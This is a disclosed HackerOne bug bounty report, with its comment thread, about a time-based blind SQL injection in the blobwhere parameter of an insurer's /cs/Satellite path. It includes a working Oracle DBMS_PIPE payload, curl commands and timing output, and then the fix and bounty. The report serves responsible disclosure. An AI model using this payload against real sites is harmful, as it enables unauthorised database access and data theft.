{"id":164739,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjQ3Mzk=","url":"https://hackerone.com/reports/164739","title":"SQL Injection on `/cs/Satellite` path","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-08-31T14:36:43.543Z","submitted_at":"2016-08-31T14:36:43.543Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"g0blin","url":"/g0blin","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/040/964/0ad6c4097c807ee8ac6e25adf0686c0c24e209e4_original.jpeg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8416,"url":"https://hackerone.com/localtapiola","handle":"localtapiola","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"LocalTapiola","twitter_handle":"","website":"http://www.lahitapiola.fi","about":"LocalTapiolaâ€™s products and services cover non-life, life and pension insurance, as well as investment and saving services."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-10-19T06:46:49.161Z","bug_reporter_agreed_on_going_public_at":"2016-10-19T06:46:49.106Z","team_member_agreed_on_going_public_at":"2016-10-19T06:38:47.513Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Summary\n\nThere exists an SQL Injection vulnerability on the path `/cs/Satellite`. This path accepts numerous fields, including `blobtable`, `blobcol`, `blobkey` and `blobwhere`. It is possible to sufficiently manipulate the the `blobwhere` field in order to trigger a time-based blind SQL Injection attack.\n\n# Scope\n\nDomain: `www.lahitapiola.fi`\nPath: `/cs/Satellite`\nParameter: `blobwhere`\nMethod: `Time-based Blind`\n\n# Proof of Concept\n\nIt is possible to recreate this vulnerability by requesting the following URL. The value `[INT]` will need to be replaced with a numeric value that has not been used in a request before. I can only assume that this is due to caching on the application or database side due to configuration.\n\n    http://www.lahitapiola.fi/cs/Satellite?blobcol=urldata\u0026blobkey=id\u0026blobtable=MungoBlobs\u0026blobwhere=1310812269330%27%20AND%205851=DBMS_PIPE.RECEIVE_MESSAGE([INT],5)%20AND%20%27bar%27=%27bar\n\nThe following terminal output demonstrates triggering this vulnerability. The first two requests trigger the vulnerability, which we know due to the response time greater than `5s`. The third request is identical to the second, however does not trigger the vulnerability due to the aforementioned assumed caching behaviour.\n\n    15:25 ~: time curl \"http://www.lahitapiola.fi/cs/Satellite?blobcol=urldata\u0026blobkey=id\u0026blobtable=MungoBlobs\u0026blobwhere=1310812269330%27%20AND%205851=DBMS_PIPE.RECEIVE_MESSAGE(1000,5)%20AND%20%27bar%27=%27bar\" -O /dev/null\n      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                     Dload  Upload   Total   Spent    Left  Speed\n    100  1019  100  1019    0     0    196      0  0:00:05  0:00:05 --:--:--   256\n    curl: (3) \u003curl\u003e malformed\n\n    real\t0m5.186s\n    user\t0m0.004s\n    sys\t0m0.008s\n    15:25 ~: time curl \"http://www.lahitapiola.fi/cs/Satellite?blobcol=urldata\u0026blobkey=id\u0026blobtable=MungoBlobs\u0026blobwhere=1310812269330%27%20AND%205851=DBMS_PIPE.RECEIVE_MESSAGE(1001,5)%20AND%20%27bar%27=%27bar\" -O /dev/null\n      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                     Dload  Upload   Total   Spent    Left  Speed\n    100  1019  100  1019    0     0    195      0  0:00:05  0:00:05 --:--:--   254\n    curl: (3) \u003curl\u003e malformed\n\n    real\t0m5.218s\n    user\t0m0.005s\n    sys\t0m0.006s\n    15:26 ~: time curl \"http://www.lahitapiola.fi/cs/Satellite?blobcol=urldata\u0026blobkey=id\u0026blobtable=MungoBlobs\u0026blobwhere=1310812269330%27%20AND%205851=DBMS_PIPE.RECEIVE_MESSAGE(1001,5)%20AND%20%27bar%27=%27bar\" -O /dev/null\n      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                     Dload  Upload   Total   Spent    Left  Speed\n    100  1019  100  1019    0     0   6195      0 --:--:-- --:--:-- --:--:--  6213\n    curl: (3) \u003curl\u003e malformed\n\n    real\t0m0.172s\n    user\t0m0.004s\n    sys\t0m0.004s\n\n# Mitigation\n\nAll user input accepted in to the application should be correctly sanitised prior to being used within queries. The field used in this attack is `blobwhere`.\n\n# Dangers\n\nAs an attacker is able to insert arbitrary SQL in to the query behind this request, they would be able to extract information behind the backing database. Depending upon configuration of the database, this could subsequently lead to disclosure of information, or execution of commands on the remote system.","bounty_amount":"400.0","formatted_bounty":"$400","weakness":{"id":67,"name":"SQL Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-11-18T06:38:47.550Z","allow_singular_disclosure_after":-154509025.07955033,"singular_disclosure_allowed":true,"vote_count":27,"voters":["smiegles","secator","michiel","bogdantcaciuc","spam404","yaworsk","geekboy","dilawer01","yassineaboukir","mdv","and 17 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1164958,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"# Additional\n\nThe above Proof of Concept is essentially escaping an opening single quote `'` in the query, and inserting its own call to a method that accepts a timeout `DBMS_PIPE.RECEIVE_MESSAGE`. This confirms we are able to manipulate the behaviour of the query, and as such can be used as a transport for data out of the database. The payload in its decoded form can be found below.\n\n    1310812269330' AND 5851=DBMS_PIPE.RECEIVE_MESSAGE([INT],5) AND 'bar'='bar","automated_response":false,"created_at":"2016-08-31T15:05:38.473Z","updated_at":"2016-08-31T15:05:38.473Z","actor":{"username":"g0blin","cleared":false,"url":"/g0blin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/964/0ad6c4097c807ee8ac6e25adf0686c0c24e209e4_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1165138,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us. LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.\n\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 7 days, but usually much faster. Bounty decisions are made 1-2 times per month, so please have patience.","automated_response":false,"created_at":"2016-08-31T16:11:12.506Z","updated_at":"2016-08-31T16:11:12.506Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1166911,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Of course - I'll not share anything regarding this issue unless instructed to do so.\n\nIf you'd like, I can construct a more thorough Proof of Concept that would demonstrate leakage of data. The reason I've not done so is that I did not want to breach any data disclosure clauses.\n\nThanks,\nJames H","automated_response":false,"created_at":"2016-09-01T06:54:30.907Z","updated_at":"2016-09-01T06:54:30.907Z","actor":{"username":"g0blin","cleared":false,"url":"/g0blin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/964/0ad6c4097c807ee8ac6e25adf0686c0c24e209e4_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1210298,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\n\nJust wondering if there's been any progress on this report, as you stated a reply within 7 days. While I appreciate the time it can take to resolve such issues, I just wanted to make sure it was being actioned.\n\nThanks\n\nKind regards,\nJames H","automated_response":false,"created_at":"2016-09-22T07:18:55.850Z","updated_at":"2016-09-22T07:18:55.850Z","actor":{"username":"g0blin","cleared":false,"url":"/g0blin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/964/0ad6c4097c807ee8ac6e25adf0686c0c24e209e4_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1213876,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello. Indeed we are looking into options on how to fix this this and yes, it will take some time. No real progress or updates in that sense to share with you.","automated_response":false,"created_at":"2016-09-24T06:40:21.930Z","updated_at":"2016-09-24T06:40:21.930Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1213889,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"That's great, thank you. I'll hold off on any more comments until I hear back from you.","automated_response":false,"created_at":"2016-09-24T06:50:16.069Z","updated_at":"2016-09-24T06:50:16.069Z","actor":{"username":"g0blin","cleared":false,"url":"/g0blin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/964/0ad6c4097c807ee8ac6e25adf0686c0c24e209e4_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1243947,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, this should be fixed now - can you confirm?","automated_response":false,"created_at":"2016-10-12T13:25:52.972Z","updated_at":"2016-10-12T13:25:52.972Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1244027,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi - looks good to me. I'm now receiving an error message instantly instead of after `n` seconds.","automated_response":false,"created_at":"2016-10-12T14:15:25.272Z","updated_at":"2016-10-12T14:15:25.272Z","actor":{"username":"g0blin","cleared":false,"url":"/g0blin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/964/0ad6c4097c807ee8ac6e25adf0686c0c24e209e4_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1255105,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2016-10-19T06:38:16.788Z","updated_at":"2016-10-19T06:38:16.788Z","actor":{"url":"/localtapiola","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"LocalTapiola"}},"bounty_amount":"400.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"localtapiola","collaborator":{"username":"g0blin","url":"/g0blin"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1255107,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for your effort.","automated_response":false,"created_at":"2016-10-19T06:38:36.628Z","updated_at":"2016-10-19T06:38:36.628Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"g0blin","url":"/g0blin"},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1255108,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-10-19T06:38:47.532Z","updated_at":"2016-10-19T06:38:47.532Z","first_to_agree":true,"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1255110,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-10-19T06:46:49.134Z","updated_at":"2016-10-19T06:46:49.134Z","actor":{"username":"g0blin","cleared":false,"url":"/g0blin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/964/0ad6c4097c807ee8ac6e25adf0686c0c24e209e4_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1255111,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-10-19T06:46:49.180Z","updated_at":"2016-10-19T06:46:49.180Z","actor":{"username":"g0blin","cleared":false,"url":"/g0blin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/964/0ad6c4097c807ee8ac6e25adf0686c0c24e209e4_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1255113,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for the bounty!","automated_response":false,"created_at":"2016-10-19T06:49:09.505Z","updated_at":"2016-10-19T06:49:09.505Z","actor":{"username":"g0blin","cleared":false,"url":"/g0blin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/964/0ad6c4097c807ee8ac6e25adf0686c0c24e209e4_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":2816,"category":"team","content":"##Issue\n\nThe reporter found an issue in the Oracle Webcenter Sites using a specific page to trigger an SQLi (time-based blind SQL Injection attack). \n\n##Fix\n\nThe issue was investigated and found to be valid. The fix was to block the flawed functionality.\n\n##Reasoning\n\nThe reported case was valid and within the scope of the bug bounty program. The issue was fixed and the reporter was awarded with a bounty. The bounty was based on consequence-risk assessment.\n","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":60017,"username":"localtapiola-thomas","name":"localtapiola-thomas","bio":"LocalTapiola Bug Bounty Coordinator - @tsmalmbe","cleared":false,"website":"http://www.lahitapiola.fi","location":"Espoo, Finland","created_at":"2016-03-09T13:58:17.117Z","url":"https://hackerone.com/localtapiola-thomas","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"legacy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://hackerone.com/rails/active_storage/representations/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBcWtrIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--ef0702cef87b20f1437c9a717c8b44719b380f58/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdCam9MY21WemFYcGxTU0lOTWpZd2VESTJNRDRHT2daRlZBPT0iLCJleHAiOm51bGwsInB1ciI6InZhcmlhdGlvbiJ9fQ==--7e37b612eb3c91a96f98ad01ca9fbe53cab870dd/hackerone-userlogo.png"}}},{"category":"researcher","can_view?":true,"can_create?":false}]}